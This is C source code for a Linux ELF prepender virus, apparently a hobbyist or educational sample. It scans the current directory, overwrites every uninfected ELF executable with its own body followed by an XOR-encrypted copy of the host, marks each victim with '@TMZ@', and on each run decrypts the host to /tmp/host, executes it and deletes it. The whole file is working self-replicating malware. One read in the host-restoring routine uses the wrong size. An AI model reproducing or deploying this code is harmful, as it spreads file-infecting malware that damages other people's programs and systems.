#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <limits.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>

#define MAX_PATH 4096

const unsigned char ELF_MAGIC[4] = {0x7f, 0x45, 0x4c, 0x46}; // b"\x7fELF"
const unsigned char INFECTION_MARK[5] = {0x40, 0x54, 0x4d, 0x5a, 0x40}; // b"@TMZ@"
#define XOR_KEYSIZE 5
const unsigned char XOR_KEY[XOR_KEYSIZE] = {0x46, 0x65, 0x32, 0x4f, 0x33}; // b"Fe2O3"
const unsigned long long VIRUS_SIZE = 17312; // this number is subject to change

void payload()
{
	puts("This is the payload of the elf prepender");
}

size_t get_file_size(const char *path)
{
	struct stat st;
	stat(path, &st);
	return st.st_size;
}

char *read_file(const char *path)
{
	size_t num_bytes_to_read = get_file_size(path);
	FILE *f = fopen(path, "r");
	char *contents = (char *)malloc(num_bytes_to_read);
	fread(contents, 1, num_bytes_to_read, f);
	fclose(f);
	return contents;
}

char *xor_enc_dec(char *input, size_t num_bytes)
{
	for (size_t i = 0; i < num_bytes; i++) {
		input[i] ^= XOR_KEY[i % XOR_KEYSIZE];
	}
	return input;
}

bool is_elf(const char *path)
{
	unsigned char ident[4] = {0};
	FILE *f = fopen(path, "r");
	fread(ident, 1, 4, f);
	fclose(f);
	// this will work for PIE executables as well
	// but can fail for shared libraries during execution
	if (strncmp(ident, ELF_MAGIC, 4) == 0)
		return true;
	return false;
}

bool is_infected(const char *path)
{
	size_t filesize = get_file_size(path);
	char *buf = read_file(path);

	bool infected = false;

	for (int x = 1; x < filesize; x++) {
		if (buf[x] == INFECTION_MARK[0]) {
			for (int y = 1; y < 5; y++) {
				if (x + y >= filesize)
					break;
				if (buf[x + y] != INFECTION_MARK[y])
					break;
				if (y == 4) {
					infected = true;
					goto is_infected_cleanup;
				}
			}
		}
	}
	is_infected_cleanup:
	free(buf);
	return infected;
}

void infect(char *virus, const char *target) {
  char *host_buf = read_file(target);
  size_t host_buf_len = get_file_size(target);
  char *encrypted_host_buf = xor_enc_dec(host_buf, host_buf_len);
  char virus_buf[VIRUS_SIZE];
  memset(virus_buf, 0, VIRUS_SIZE);
  FILE *f = fopen(virus, "r");
  fread(virus_buf, 1, VIRUS_SIZE, f);

  FILE *infected = fopen(target, "w+");
  // printf("%p %s\n", infected, target);
  // fflush(stdout);
  fwrite(virus_buf, 1, VIRUS_SIZE, infected);
  fwrite(encrypted_host_buf, 1, host_buf_len, infected);
  fflush(infected);
  fclose(infected);

  free(host_buf);
}

void run_infected_host(const char *path) {
  size_t infected_file_size = get_file_size(path);
  size_t host_file_size = infected_file_size - VIRUS_SIZE;
  char *encrypted_host_buf = (char *)calloc(host_file_size, 1);
  FILE *infected = fopen(path, "r");

  const char plain_host_path[10] = "/tmp/host";
  int plain_host_fd = open(plain_host_path, O_CREAT | O_WRONLY, 0755);
  FILE *plain_host = fdopen(plain_host_fd, "w");

  fseek(infected, VIRUS_SIZE, SEEK_SET);
  fread(encrypted_host_buf, 1, VIRUS_SIZE, infected);
  fclose(infected);

  char *decrypted_host_buf = xor_enc_dec(encrypted_host_buf, host_file_size);
  fwrite(decrypted_host_buf, 1, host_file_size, plain_host);
  fflush(plain_host);
  fclose(plain_host);

  free(encrypted_host_buf);

  system(plain_host_path); // runs the /tmp/host file
  unlink(plain_host_path); // remove the file
}

int main(int argc, char **argv, char **envp)
{
  char cwd[MAX_PATH];
  if (getcwd(cwd, MAX_PATH) == NULL) {
    return 0;
  }

  DIR *current_dir = opendir(cwd);

  struct dirent *entry;

  while (entry = readdir(current_dir)) {
    if (entry->d_type == DT_REG) {
      // printf("%s %s\n", argv[0], entry->d_name);
      if (strncmp(&argv[0][2], entry->d_name, 256) == 0) {
	continue;
      }
      if (is_elf(entry->d_name)) {
	if (!is_infected(entry->d_name)) {
	  // printf("infecting %s\n", entry->d_name);
	  infect(argv[0], entry->d_name);
	}
      }
    }
  }

  closedir(current_dir);

  if (get_file_size(argv[0]) > VIRUS_SIZE) {
    payload();
    run_infected_host(argv[0]);
  } else {
    exit(0);
  }


  return 0;
}
